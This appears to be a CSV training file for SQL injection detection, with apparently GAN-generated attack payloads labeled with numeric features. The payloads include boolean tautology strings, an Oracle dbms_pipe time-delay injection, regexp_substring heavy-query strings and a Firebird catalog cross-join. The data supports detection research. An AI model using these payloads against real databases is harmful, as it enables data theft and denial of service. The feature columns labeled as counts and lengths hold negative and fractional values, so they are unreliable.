id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000304,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,6.26211023451659,178.64004516601562,18.14055061340332,18.981826782226562,51.0004768371582,-0.09116898477077484,30.779821395874023,20.406007766723633,1.0004191398620605,0.26374852657318115,0.20524847507476807,0.41798922419548035,0.11747314035892487,4.036757946014404,0.8665688037872314,0.7790738344192505,1.8334660530090332,-0.02346169576048851,-0.19059616327285767,0.04024793207645416,3.6600558757781982,8.1220064163208,2.0937774181365967,-0.0026194832753390074,0.7538933157920837,-0.03242870047688484,0.08527332544326782,0.10566826909780502,-0.6403780579566956,-0.0007719524437561631,0.1651335209608078,-0.2891356348991394,0.35641592741012573,0.47300615906715393,1.1861146688461304,0.5856700539588928,3.0965077877044678,1.8073253631591797,-0.29418355226516724,0.7376106977462769,0.6116721630096436,0.12416677922010422,-0.10705507546663284,-0.29920297861099243,-0.7035604119300842,0.5694521069526672,0.8854933381080627,0.3242751657962799,-0.15282942354679108,-0.08561214059591293,-0.2969764173030853,0.1070602759718895,-0.22773072123527527,-0.7659527063369751,-0.023674948140978813,-0.2891523838043213,0.011601357720792294,-0.21886105835437775,-0.03177741914987564,0.9586089849472046,-0.03184596821665764,0.8235304355621338,-0.017367038875818253,-0.0005887924344278872,-0.014719171449542046,-0.0757431834936142,0.06134806200861931,-0.07800103724002838,-1.4625369310379028,-1.1262032985687256,0.5215157270431519,-0.016655316576361656,-0.3015289008617401,-0.10291502624750137,-1.0657910108566284,-0.6350662112236023,0.31924867630004883,0.21893510222434998,-0.912224292755127,-0.04220914840698242,-0.40564990043640137,2.4742560386657715,0.762448787689209,0.35319751501083374,-0.7687618136405945,-0.27776676416397095,0.16289518773555756,0.17405620217323303,0.00039917448884807527
GAN_000305,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,4.19802196160683,157.9229736328125,21.450593948364258,24.32530975341797,63.59933090209961,-0.042310893535614014,39.57835388183594,19.197837829589844,0.9989147186279297,0.2700117528438568,0.1753271073102951,0.3941003084182739,0.13096876442432404,3.646667242050171,1.0730599164962769,0.9035426378250122,1.3512643575668335,0.05287276953458786,-0.08672304451465607,0.05007033050060272,2.1383793354034424,7.9672441482543945,1.978459358215332,0.005764580797404051,1.2187187671661377,-0.0077849458903074265,0.009275984950363636,0.2250414341688156,0.8842220306396484,0.40052330493927,0.053529009222984314,-0.24704577028751373,0.2791726887226105,0.21831057965755463,0.6688098907470703,1.1684688329696655,4.072735786437988,1.4513872861862183,-0.10438317805528641,0.17263013124465942,0.4170635938644409,0.34988707304000854,0.14068421721458435,-0.1247418075799942,-0.04268770292401314,0.08377927541732788,0.49821776151657104,0.21801728010177612,0.020681969821453094,0.05508909001946449,0.00719995005056262,0.08406901359558105,0.0409608818590641,-0.3964722156524658,-0.032725028693675995,-0.08427152782678604,0.013782094232738018,0.15629103779792786,-0.1380167156457901,0.6173112988471985,-0.011154726147651672,0.2629302144050598,-0.00736947450786829,0.9337230920791626,0.17327584326267242,-0.015035047195851803,0.028275232762098312,0.013947956264019012,-0.63938969373703,-0.34284159541130066,0.03628196939826012,-0.2216326743364334,-0.18322619795799255,-0.020795566961169243,-0.5755071043968201,-0.023891884833574295,0.8756753206253052,0.24605002999305725,-0.57390958070755,0.19875940680503845,-0.2198120355606079,3.568110466003418,0.8162378668785095,0.26026830077171326,-0.5896732211112976,-0.5843722224235535,-0.28649798035621643,-0.3259292542934418,-0.0005166048067621887
GAN_000306,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,6.044158041816559,246.18930053710938,45.82172775268555,23.31214141845703,74.92340850830078,-0.056325070559978485,51.8284797668457,24.853519439697266,1.0003007650375366,0.3177546262741089,0.08094922453165054,0.4196958541870117,0.10315603762865067,4.035347938537598,1.044216513633728,1.9540523290634155,1.8495336771011353,-0.0773598775267601,0.08788132667541504,0.0007843735511414707,5.8009352684021,8.529199600219727,3.3705859184265137,0.015617254190146923,1.0572751760482788,-0.02600099705159664,0.09515033662319183,0.13596601784229279,0.5050103664398193,0.329214483499527,0.121100053191185,-0.040289364755153656,0.4275988042354584,0.38401180505752563,1.1370679140090942,0.9094852805137634,3.6540708541870117,2.0723698139190674,0.4129050672054291,0.23609507083892822,0.5655225515365601,0.394836962223053,-0.10380459576845169,-0.03885198384523392,-0.6620246171951294,0.15920326113700867,0.43026483058929443,0.3208824396133423,0.005335822235792875,-0.004126377869397402,-0.18027399480342865,0.2070496380329132,-0.636066198348999,-0.25002196431159973,-0.30381566286087036,-0.1419300138950348,0.0353790745139122,-0.02582092583179474,-0.27272164821624756,0.867390513420105,-0.017340419813990593,0.8539819121360779,-0.022727036848664284,-0.5476096868515015,0.39974141120910645,-0.07371728867292404,0.07823669165372849,-0.07755352556705475,-1.1159340143203735,-0.6688981056213379,0.32439014315605164,-0.4191890358924866,-0.3241555690765381,-0.11185082048177719,-0.5687057375907898,-0.6054286360740662,0.5860210061073303,0.0834059938788414,-0.4455622732639313,-0.00549940625205636,-0.7436755895614624,4.129179000854492,0.7045691609382629,0.16643026471138,-0.8906652331352234,-0.021345987915992737,-0.099989153444767,-0.15984278917312622,-0.001123848487623036
GAN_000307,attack,boolean,"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001119,3.7712432901098394,128.4179229736328,31.696104049682617,20.38222312927246,39.74392318725586,-0.017928335815668106,24.824569702148438,19.512767791748047,0.9999290108680725,0.23170670866966248,0.21747863292694092,0.39075854420661926,0.13953045010566711,3.597696304321289,1.2216010093688965,0.7149403095245361,1.7049070596694946,-0.0008981411810964346,-0.04554712399840355,0.011152439750730991,2.481532573699951,5.812411308288574,1.4027323722839355,0.005607366096228361,1.201460361480713,-0.007828857749700546,0.062231723219156265,0.29059648513793945,0.4534648656845093,0.3527070879936218,0.06234225630760193,-0.38432514667510986,0.23614293336868286,0.40785542130470276,0.7269274592399597,1.3872145414352417,2.068356990814209,1.0588126182556152,0.014050474390387535,-0.10964524745941162,0.5872176885604858,0.18853162229061127,0.2079431116580963,-0.21839258074760437,-0.29184696078300476,0.4495766758918762,0.3082858920097351,0.19806250929832458,0.07864829152822495,0.014569557271897793,-0.08374861627817154,0.07678214460611343,-0.1791912317276001,-0.3496888279914856,0.04997871443629265,-0.06795806437730789,0.031529251486063004,-0.04842482507228851,-0.2192174792289734,0.6190310716629028,-0.012160963378846645,0.1812615692615509,-0.004083808045834303,0.654212236404419,0.18065468966960907,-0.011486693285405636,0.05531245842576027,-0.29845142364501953,-0.5396133661270142,-0.5140899419784546,0.3256549537181854,-0.28319689631462097,-0.15232771635055542,-0.04694882035255432,-0.47615179419517517,-0.177226260304451,0.7810989618301392,0.4174385964870453,-0.43627113103866577,-0.0026606752071529627,-0.29204049706459045,2.46278977394104,0.8730886578559875,0.2903923988342285,-0.20567774772644043,-0.037212491035461426,-0.08540882915258408,-0.2344176322221756,0.021793542429804802
GAN_000308,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,7.368105117179292,269.2043762207031,9.849903106689453,26.796201705932617,63.780738830566406,-0.06495500355958939,60.081241607666016,22.478107452392578,0.9981299042701721,0.3554934859275818,0.15043000876903534,0.42161455750465393,0.10445456206798553,4.17061710357666,0.31101134419441223,0.8351109027862549,0.6526720523834229,-0.047246214002370834,-0.1768980324268341,0.034311238676309586,8.771126747131348,10.176395416259766,1.0991567373275757,0.021587472409009933,1.140410304069519,-0.017437269911170006,0.07119180262088776,0.03613210469484329,0.0416652113199234,0.10380829870700836,0.14325425028800964,-0.5429369211196899,0.5471376180648804,-0.3762405216693878,0.5737728476524353,0.8427973389625549,8.480596542358398,3.180471658706665,0.009058227762579918,0.6683043837547302,0.742747962474823,0.20568279922008514,0.46079984307289124,-0.525076150894165,0.2617332637310028,-0.9370924234390259,0.9952051043510437,0.4027177393436432,-0.10128483921289444,0.3200819790363312,0.020962364971637726,0.07546640932559967,-0.3654916286468506,0.2309199571609497,0.12611794471740723,-0.6600340604782104,0.017575107514858246,-0.44515684247016907,0.30939769744873047,1.8244127035140991,-0.021342331543564796,-0.27134519815444946,-0.026236042380332947,0.3951176106929779,0.8902463912963867,0.008081120438873768,-0.00700610363855958,0.38492143154144287,-1.696438193321228,-0.9490361213684082,0.04998301714658737,0.3627704083919525,-0.0655018538236618,-0.17084753513336182,-0.9537147879600525,-1.0829578638076782,0.32922646403312683,0.1874101758003235,-1.0942208766937256,0.31230995059013367,0.027046844363212585,4.968673229217529,0.8453832864761353,-0.19831222295761108,-0.23458251357078552,-0.3306552767753601,-0.2628088593482971,-0.6412093639373779,0.056811846792697906
GAN_000309,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.133363195349808,243.94895935058594,41.90962219238281,26.85894775390625,86.97649383544922,-0.059597015380859375,68.33553314208984,30.177709579467773,0.9991202354431152,0.370253324508667,0.04293746501207352,0.37103068828582764,0.10982513427734375,4.180458068847656,1.3296754360198975,1.254115343093872,0.9704380631446838,0.003000598633661866,0.15583884716033936,0.06365169584751129,7.754286766052246,9.512490272521973,4.451254844665527,0.0005035347421653569,1.2479146718978882,-0.01260344497859478,0.014871404506266117,0.2105180323123932,1.1627768278121948,0.7726112008094788,0.07112528383731842,-0.0845043733716011,0.3740348219871521,0.0891551747918129,0.8613409996032715,1.177223563194275,5.530041217803955,1.807066798210144,0.4755629897117615,0.2542383670806885,0.43122076988220215,0.7176427245140076,0.25081294775009155,-0.33962082862854004,-0.4644244909286499,0.009926974773406982,0.26100629568099976,0.206928089261055,0.09549200534820557,0.16042567789554596,-0.06866941601037979,0.16447868943214417,0.055228471755981445,-0.1937733292579651,-0.3307696580886841,-0.14757466316223145,0.024060556665062904,0.138554647564888,-0.10996250808238983,0.6877962350845337,-0.00938755925744772,0.4618326425552368,-0.008252618834376335,0.6375442743301392,0.08555775135755539,-0.04950494319200516,-0.013222507201135159,-0.02334418147802353,-0.631567656993866,-0.16896864771842957,-0.09105344861745834,0.038271863013505936,0.10723306238651276,-0.031809065490961075,-0.6194525361061096,-0.6072928309440613,1.1169015169143677,0.12216805666685104,-0.5370100140571594,0.2810559570789337,-0.4666423797607422,6.630076885223389,0.7511183619499207,-0.05373186618089676,-0.40003737807273865,-0.4265837073326111,-0.4264465570449829,0.021922439336776733,-0.004953095223754644
GAN_000310,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,7.526519650551682,-14.48078727722168,-15.160087585449219,12.689889907836914,-13.515420913696289,-0.0017691889079287648,-38.41053771972656,4.722755432128906,1.0005619525909424,0.04853568598628044,0.46089881658554077,0.47192612290382385,0.1573997288942337,2.7911689281463623,0.41078081727027893,0.6469997763633728,3.3033783435821533,-0.015234854072332382,-0.5737438797950745,-0.06693163514137268,-4.257697582244873,3.0185439586639404,-3.168578624725342,0.057589851319789886,0.7070679068565369,-0.019602641463279724,0.16774730384349823,0.15884199738502502,-1.0380268096923828,-0.5431312322616577,0.13213078677654266,-0.6511372923851013,0.23523245751857758,0.46009308099746704,0.9574257731437683,1.069852352142334,-2.449833869934082,0.3374565839767456,-1.1874995231628418,0.21588337421417236,1.2129679918289185,-0.696367084980011,-0.07643125206232071,0.11726315319538116,0.11522633582353592,1.1099904775619507,0.9904527068138123,0.32258960604667664,-0.23684294521808624,-0.21670661866664886,-0.2908603549003601,0.029859401285648346,-0.478925883769989,-0.5673820376396179,0.5800013542175293,-0.39921554923057556,0.038952507078647614,-0.4520120918750763,0.05566935986280441,0.6413924694061279,-0.03226950764656067,0.5287278890609741,-0.019209660589694977,-0.3279602825641632,0.3821159601211548,0.03266964852809906,0.17305178940296173,-0.24429786205291748,-1.282590389251709,-1.915041446685791,0.6675261855125427,-0.5618473887443542,-0.7870355844497681,-0.12658463418483734,-0.9012839794158936,0.4705131947994232,-0.16478106379508972,0.47496092319488525,-0.3846421241760254,-0.3965367376804352,-0.2521718442440033,-3.1686007976531982,0.8877845406532288,0.35519731044769287,-0.7766292691230774,-0.09424780309200287,0.39204490184783936,-0.23327313363552094,0.05142175033688545
GAN_000311,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,8.97449103672039,30.530038833618164,-34.28535461425781,14.095658302307129,-4.199720859527588,-0.07377453148365021,-32.919288635253906,1.0729539394378662,0.999257504940033,0.0334094874560833,0.41830405592918396,0.4967791438102722,0.14256168901920319,3.190720319747925,0.18823102116584778,0.5413808226585388,2.8898255825042725,-0.11735030263662338,-0.6362015008926392,-0.05648746341466904,-1.857258677482605,5.954316139221191,-2.9709525108337402,0.03586587682366371,0.47916606068611145,-0.031643521040678024,0.20021244883537292,-0.15022720396518707,-1.4590418338775635,-0.5980074405670166,0.20291103422641754,-0.707992672920227,0.19643615186214447,0.2997405529022217,1.0640276670455933,0.5014137625694275,-0.8133154511451721,1.3397423028945923,-1.5831650495529175,0.700808584690094,1.3013300895690918,-0.7238910794258118,-0.023979008197784424,-0.19399413466453552,-0.017848938703536987,0.7179044485092163,1.4410643577575684,0.3230767250061035,-0.42493709921836853,-0.1529572755098343,-0.37038353085517883,-0.015053078532218933,-0.25329524278640747,-0.44229283928871155,0.7381121516227722,-0.4919728934764862,0.011401320807635784,-0.735141396522522,0.5044882297515869,1.2049189805984497,-0.041565511375665665,0.26288098096847534,-0.02932746149599552,-1.6345006227493286,0.19861334562301636,0.044125817716121674,0.11581697314977646,-0.04794805496931076,-2.1830530166625977,-2.266407012939453,0.5384383201599121,-0.14222270250320435,-0.709413468837738,-0.16364909708499908,-1.3593906164169312,-0.16379696130752563,-0.2166633903980255,0.321590781211853,-1.041557788848877,-0.4278427064418793,-0.04813548922538757,-3.6506121158599854,0.889557957649231,0.24784865975379944,-0.6047113537788391,-0.5991398096084595,0.5407803654670715,-0.11890151351690292,0.06776510924100876
GAN_000312,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,7.5424222596300865,331.2652587890625,67.91393280029297,28.37745475769043,116.42774963378906,-0.10713133215904236,82.51710510253906,35.04152297973633,0.9994670748710632,0.45507076382637024,-0.03882966190576553,0.37361854314804077,0.0684598907828331,4.581834316253662,1.2579429149627686,1.7930597066879272,0.7621293663978577,-0.06237887963652611,0.255265474319458,0.11791562288999557,11.596518516540527,10.479430198669434,6.114990711212158,0.014878996647894382,1.0585883855819702,-0.03135775402188301,0.03838951513171196,0.20182904601097107,0.4473501741886139,0.5612930655479431,0.11265377700328827,0.3349151015281677,0.5280752182006836,-0.04420367255806923,1.160270094871521,0.7147645354270935,7.429744243621826,2.754474639892578,1.1751065254211426,0.7354726791381836,0.35696038603782654,0.9465179443359375,0.15504485368728638,-0.29070553183555603,-0.6424444317817688,-0.6719217300415039,0.4229162335395813,0.3217337131500244,0.052570898085832596,0.10336683690547943,-0.12808378040790558,0.18698863685131073,-0.37252065539360046,-0.11850292980670929,-0.4843636155128479,-0.5745944976806641,0.03784115985035896,-0.04514846205711365,-0.2958846986293793,1.0517531633377075,-0.014360323548316956,0.337477445602417,-0.024881908670067787,0.3536011278629303,0.7314096689224243,-0.05097272992134094,0.0022648307494819164,-0.151279479265213,-0.979710042476654,-0.39771345257759094,0.36010491847991943,-0.31202802062034607,-0.10215794295072556,-0.07387528568506241,-0.4742816388607025,-0.9357035756111145,0.9695062637329102,0.059306852519512177,-0.7063472867012024,0.3649140000343323,-0.48433172702789307,8.60049057006836,0.6136505603790283,-0.09467343240976334,-0.8109661936759949,-0.27600908279418945,-0.4234333038330078,-0.3654157817363739,-0.03405222296714783
GAN_000313,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,6.2954909787858035,263.89990234375,42.6654167175293,21.137718200683594,90.77506256103516,-0.08547499030828476,61.3851203918457,28.129234313964844,0.9999881386756897,0.38561341166496277,0.044219471514225006,0.3978414833545685,0.10364443063735962,4.340292930603027,0.886519193649292,1.5610876083374023,1.376696228981018,-0.05827184394001961,0.06534911692142487,0.08050580322742462,6.5197296142578125,9.31689167022705,4.7392730712890625,0.009837312623858452,0.942861020565033,-0.03641176596283913,0.07872568815946579,0.1627499908208847,-0.1824837476015091,0.39935749769210815,0.1352265477180481,0.21494628489017487,0.3660234212875366,0.2992457151412964,1.2978730201721191,0.6823394894599915,4.748775005340576,1.8957746028900146,0.36505383253097534,0.6694355010986328,0.32889968156814575,0.6350277066230774,-0.14131379127502441,-0.16642418503761292,-0.7929156422615051,0.34923630952835083,0.4227621555328369,0.2846148908138275,-0.0943588986992836,-0.09585828334093094,-0.2417093962430954,0.15474200248718262,-0.20986750721931458,-0.4944298565387726,-0.4799736738204956,-0.4137585461139679,0.01346677541732788,-5.418876025942154e-05,-0.1490556299686432,0.807820200920105,-0.020191334187984467,0.794999361038208,-0.019865894690155983,-0.9471603631973267,0.195565864443779,-0.09076721221208572,0.03722602128982544,-0.11278101801872253,-1.191149115562439,-0.6897776126861572,0.3737585246562958,-0.03827265650033951,-0.430616170167923,-0.06595837324857712,-0.6165978908538818,-0.6532273292541504,0.740156888961792,0.09904571622610092,-0.5553548336029053,0.09838297963142395,-0.7225993871688843,5.4842610359191895,0.6452317237854004,0.1307016909122467,-1.13198721408844,-0.39636921882629395,-0.23163898289203644,0.2933763861656189,-0.03843037039041519
